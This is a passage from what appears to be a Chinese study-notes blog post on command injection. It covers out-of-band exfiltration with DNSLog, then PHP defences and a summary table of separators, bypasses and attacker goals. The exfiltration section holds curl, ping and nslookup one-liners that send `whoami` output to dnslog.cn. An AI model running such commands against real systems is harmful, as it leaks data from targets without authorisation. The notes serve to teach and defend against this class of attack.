+<h3 id="4-DNSLog-外带数据"><a href="#4-DNSLog-外带数据" class="headerlink" title="4. DNSLog 外带数据"></a>4. DNSLog 外带数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux</span><br>curl http://`<span class="hljs-built_in">whoami</span>`.dnslog.cn<br>ping -c 1 `<span class="hljs-built_in">whoami</span>`.dnslog.cn<br><br><span class="hljs-comment"># Windows</span><br>ping `<span class="hljs-built_in">whoami</span>`.dnslog.cn<br>nslookup `<span class="hljs-built_in">whoami</span>`.dnslog.cn<br></code></pre></td></tr></table></figure>
+
+<h2 id="九、命令注入防御"><a href="#九、命令注入防御" class="headerlink" title="九、命令注入防御"></a>九、命令注入防御</h2><ol>
+<li><strong>避免直接调用系统命令</strong>：尽量使用语言内置的函数库</li>
+<li><strong>参数化调用</strong>：使用 <code>escapeshellarg()</code>、<code>escapeshellcmd()</code> 对参数转义</li>
+<li><strong>白名单验证</strong>：只允许特定字符，如 IP 地址只允许数字和点</li>
+<li><strong>输入过滤</strong>：过滤命令分隔符、特殊字符</li>
+<li><strong>最小权限</strong>：Web 应用以低权限用户运行</li>
+<li><strong>禁用危险函数</strong>：在 <code>php.ini</code> 中禁用 <code>system</code>、<code>exec</code>、<code>shell_exec</code>、<code>passthru</code>、<code>popen</code>、<code>proc_open</code> 等</li>
+<li><strong>WAF</strong>：部署 Web 应用防火墙拦截命令注入攻击</li>
+<li><strong>日志监控</strong>：记录并监控命令执行日志</li>
+</ol>
+<h3 id="PHP-中转义函数"><a href="#PHP-中转义函数" class="headerlink" title="PHP 中转义函数"></a>PHP 中转义函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>escapeshellarg()</code></td>
+<td>将字符串转义为安全的 shell 参数</td>
+</tr>
+<tr>
+<td><code>escapeshellcmd()</code></td>
+<td>转义 shell 元字符</td>
+</tr>
+<tr>
+<td><code>filter_var()</code></td>
+<td>使用过滤器验证输入</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$ip</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span> . <span class="hljs-variable">$ip</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>本质</td>
+<td>用户输入被拼接到系统命令中执行</td>
+</tr>
+<tr>
+<td>核心条件</td>
+<td>应用程序调用系统命令，且未对用户输入做严格过滤</td>
+</tr>
+<tr>
+<td>常见分隔符</td>
+<td><code>;</code>、<code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>、<code>$()</code>、反引号、<code>%0a</code></td>
+</tr>
+<tr>
+<td>常见绕过</td>
+<td>大小写、编码、<code>${IFS}</code>、通配符、变量拼接、引号</td>
+</tr>
+<tr>
+<td>常见目标</td>
+<td>反弹 Shell、写入 WebShell、外带数据</td>
+</tr>
+<tr>
+<td>防御核心</td>
+<td>避免调用系统命令 + 参数化 + 白名单 + 最小权限</td>
+</tr>
+</tbody></table>
+<h2 id="十一、参考资料"><a href="#十一、参考资料" class="headerlink" title="十一、参考资料"></a>十一、参考资料</h2><ul>
+<li>原文笔记整理</li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令注入漏洞知识总结</div>
+      <div>https://blessing-heavenly.github.io/2026/09/11/命令注入漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Seth</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/09/11/XSS%E6%BC%8F%E6%B4%9E/" title="XSS（跨站脚本攻击）知识总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XSS（跨站脚本攻击）知识总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/09/11/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81%E6%80%BB%E7%BB%93/" title="常见密码与编码总结">
+                        <span class="hidden-mobile">常见密码与编码总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      凡是过往，皆为序章
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
